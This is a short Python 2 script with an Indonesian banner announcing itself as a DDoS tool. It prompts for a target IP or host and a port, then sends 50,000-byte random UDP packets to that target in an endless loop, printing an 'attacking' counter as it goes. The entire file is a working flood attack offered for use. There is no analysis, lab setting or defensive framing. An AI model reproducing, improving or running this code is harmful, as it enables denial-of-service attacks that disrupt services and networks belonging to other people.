import time

import datetime

import socket

import random

import sys

import os


os.system("clear")

os.system("figlet DDOS")

time = time.ctime(time.time())

def main():

   print len(sys.argv)

   if len(sys.argv) != 2:

    print"\033[91m=========================================="
    print"\033[92mSELAMAT DATANG DI SC DDOS"
    print" "
    print"\033[92m[INFO SC]"
    print" "
    print"\033[92mBahasa pemrograman: Python"
    print" SC DDOS MATRE by DNS"
    print"\033[91m=========================================="
    print" "
    print("\033[94mWaktu sekarang:") ,time
    print" "

    ip = raw_input ("\033[95mMasukkan ip/host target:")

    port = input ("Masukkan port: ")

    bytes = input ("Masukkan bytes/paket:")


    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bytes = random._urandom(50000)

    sent = 0

    while True:

        sock.sendto(bytes, (ip, port))

        port = port + 0

        sent = sent + 1

        print "\033[94mMenyerang \033[91m%s \033[94mdengan port \033[91m%s \033[94mbytes \033[91m%s"%(ip, port, sent)


if __name__ == '__main__':

        main()
